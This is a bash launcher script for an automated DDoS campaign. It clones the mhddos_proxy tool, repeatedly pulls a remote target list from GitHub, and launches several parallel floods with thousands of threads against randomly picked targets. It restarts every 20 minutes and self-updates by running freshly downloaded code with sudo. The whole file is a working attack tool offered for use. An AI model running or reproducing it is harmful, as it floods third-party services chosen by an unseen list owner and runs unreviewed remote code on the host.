#!/bin/bash

#test

restart_interval="20m"

ulimit -n 1048576

cd ~
git clone -b docker https://github.com/alexnest-ua/auto_mhddos_alexnest
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy

#Just in case kill previous copy of mhddos_proxy
echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
sudo pkill -e -f runner.py
sudo pkill -e -f finder.py
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"


num_of_copies="${1:-1}"
if [[ "$num_of_copies" == "all" ]];
then	
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 4 parallel attacks (more than 4 is not effective)\033[0;0m\n"
	num_of_copies=4
elif ((num_of_copies > 4));
then 
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 4 parallel attacks (more than 4 is not effective)\033[0;0m\n"
	num_of_copies=4
elif ((num_of_copies < 1));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 1 parallel attack (less than 1 is not effective)\033[0;0m\n"
	num_of_copies=1
elif ((num_of_copies != 1 && num_of_copies != 2 && num_of_copies != 3  && num_of_copies != 4));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 1 parallel attack\033[0;0m\n"
	num_of_copies=1
fi

threads="${2:-2500}"
if ((threads < 2500));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 2500 threads\033[0;0m\n"
	threads=2500
elif ((threads > 15000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 15000 threads\033[0;0m\n"
	threads=15000
fi

rpc="${3:-1000}"

debug="${4:-}"
if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ] && [ "${debug}" != "--vpn" ] && [ "${debug}" != "EN" ];
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with parameter --debug (--table is not supported in our script)\033[0;0m\n"
	debug="--debug"
fi

if [[ $debug == "EN" ]];
then
	debug="--lang EN"
fi




# Restarts attacks and update targets list every 20 minutes
while [ 1 == 1 ]
do	
	proc_num=$(nproc --all)
	if ((proc_num < 2));
	then
		if ((threads > 5000));
		then
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for 1 CPU - attack will be started with 5000 async threads\033[0;0m\n"
			threads=5000
		elif ((threads < 2500));
		then
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads for 1 CPU - attack will be started with 2500 async threads\033[0;0m\n"
			threads=2500
		fi
		
		if ((num_of_copies > 1));
		then 
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so attack will be started only with 1 parallel attack\033[0;0m\n"
			num_of_copies=1
		fi
	
	elif ((proc_num >= 2 && proc_num < 4));
	then
		if ((threads > 10000));
		then
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for $proc_num CPUs - attack will be started with 10000 async threads\033[0;0m\n"
			threads=10000
		elif ((threads < 6000));
		then
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads for $proc_num CPUs - attack will be started with 6000 async threads\033[0;0m\n"
			threads=6000
		fi
	
	
		if ((num_of_copies > 1));
		then 
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so attack will be started only with 1 parallel attack\033[0;0m\n"
			num_of_copies=1
		fi

	elif ((proc_num >= 4));
	then
		if ((threads < 7500));
		then
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads for $proc_num CPUs - attack will be started with 7500 async threads\033[0;0m\n"
			threads=7500
		fi
		
		if ((num_of_copies < 2));
		then 
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have $proc_num CPUs, so attack will be started with 2 parallel attack(s)\033[0;0m\n"
			num_of_copies=2
		fi

	fi


	sleep 4s

	cd ~/mhddos_proxy	
	num0=$(sudo git pull --ff-only | grep -E -c 'Already|Уже|Вже')
   	echo "$num0"   	
   	if ((num0 == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
	else
		python3 -m pip install -r requirements.txt
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
		sleep 2s
	fi
	
	cd ~/auto_mhddos_alexnest
   	num=$(sudo git pull --ff-only | grep -E -c 'Already|Уже|Вже')
   	echo "$num"   	
   	if ((num == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos_alexnest"
	else
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos_alexnest"
		bash runner.sh $num_of_copies $threads $rpc $debug # run new downloaded script 
	fi
	#
   	sleep 2s
	
   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]" | wc -l)
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
	
	if ((num_of_copies > list_size));
	then 
		random_numbers=$(shuf -i 1-$list_size -n $list_size)
		copies=$num_of_copies
	else
		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
		copies=1
	fi
	
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
		
	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
	sleep 3s
	# Launch multiple mhddos_proxy instances with different targets.
   	for i in $random_numbers
   	do
            	echo -e "\n I = $i"
             	# Filter and only get lines that not start with "#". Then get one target from that filtered list.
            	cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
           
            	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
            	echo "python3 runner.py $cmd_line --rpc $rpc -t $threads --copies $copies --vpn $debug"
            
            	cd ~/mhddos_proxy
            	AUTO_MH=1 python3 runner.py $cmd_line -t $threads --copies $copies --vpn $debug&
	    	sleep 20s
            	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
   	done
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update in $restart_interval ...\033[1;0m"

	sleep $restart_interval
	clear
   	
   	#Just in case kill previous copy of mhddos_proxy
   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with DDoS and finder"
   	sudo pkill -e -f runner.py
	sudo pkill -e -f finder.py
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with DDoS and finder killed\033[0;0m\n"
	
   	no_ddos_sleep="$(shuf -i 1-3 -n 1)m"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to let your computer cool down...\033[0m\n"
	sleep $no_ddos_sleep
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
done
